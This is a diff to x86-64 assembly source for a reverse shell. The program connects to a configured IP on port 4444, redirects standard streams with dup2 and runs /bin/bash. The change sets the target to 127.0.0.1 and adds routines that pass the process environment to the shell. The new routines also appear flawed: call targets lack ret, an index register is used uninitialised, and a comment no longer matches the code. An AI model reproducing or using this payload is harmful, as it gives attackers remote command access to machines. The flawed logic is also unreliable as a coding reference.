@@ -1,6 +1,6 @@
 section .data
     command db '/bin/bash', 0
-    ip_str db '', 0 ; Put IP address here
+    ip_str db '127.0.0.1', 0 ; Put IP address here
     port_str db '4444', 0
     
     err_ip_format db 'Error: Invalid IP format', 10, 0
@@ -10,11 +10,20 @@ section .data
 section .bss
     ip_bytes resd 1
     port_bytes resw 1
+    envp resq 256
 
 section .text
     global _start
 
 _start:
+    ; Get stack pointer
+    mov rbx, rsp
+    ; Jump after argc
+    add rbx, 8
+
+    call jmp_arg
+    call jmp_envp
+
     call validate_and_parse_ip
     test rax, rax
     jz ip_format_error
@@ -26,6 +35,25 @@ _start:
     
     jmp connect
 
+jmp_arg:
+    ; Jump through each argument passed until NULL is reached
+    mov rax, [rbx]
+    add rbx, 8
+    test rax, rax
+    jnz jmp_arg
+
+jmp_envp:
+    ; Jump and store all environnemental variables until NULL is reached
+    mov rax, [rbx]
+    test rax, rax
+    je done_envp
+    mov [envp + rcx*8], rax
+    inc rcx
+    add rbx, 8
+    jmp jmp_envp
+done_envp:
+    ; Pass NULL to mark end of array
+    mov  qword [envp + rcx*8], 0
 validate_and_parse_ip:
     push rbp
     mov rbp, rsp
@@ -201,7 +229,7 @@ dup2_loop:
     mov rax, 59         ; sys_execve
     lea rdi, [command]
     xor rsi, rsi        ; argv = NULL  
-    xor rdx, rdx        ; envp = NULL
+    mov rdx, envp        ; envp = NULL
     syscall
     
     ; Should not reach here
